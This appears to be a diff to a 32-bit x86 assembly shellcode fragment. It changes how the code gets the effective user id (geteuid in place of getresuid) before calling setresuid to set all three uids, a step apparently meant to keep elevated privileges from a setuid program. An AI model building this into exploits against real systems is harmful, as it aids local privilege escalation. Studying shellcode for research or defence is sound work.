@@ -3,22 +3,15 @@
 
 BITS 32
 
-    ;; get real, effective, and set uid at known addresses via getresuid()
-    mov ebx, esp  ; uid_t *ruid
-    mov ecx, esp
-    mov edx, esp
-    add ecx, 0x04 ; uid_t *euid
-    add edx, 0x04 ; uid_t *suid
-    
-    ; getresuid syscall
-    xor eax,eax
-    mov al, 0xd1
+    ;; get effective user id via geteuid syscall
+    xor eax, eax
+    mov al, 0xc9
     int 0x80
 
-    ;; set real, effective, and set uid to obtained values via setresuid()
-    mov ebx, DWORD [ebx] ; uid_t ruid
-    mov ecx, DWORD [ecx] ; uid_t euid
-    mov edx, DWORD [edx] ; uid_t suid
+    ;; set real, effective, and set uids via setresuid()
+    mov ebx, eax ; uid_t ruid
+    mov ecx, eax ; uid_t euid
+    mov edx, eax ; uid_t suid
 
     ; setresuid syscall
     mov al, 0xd0
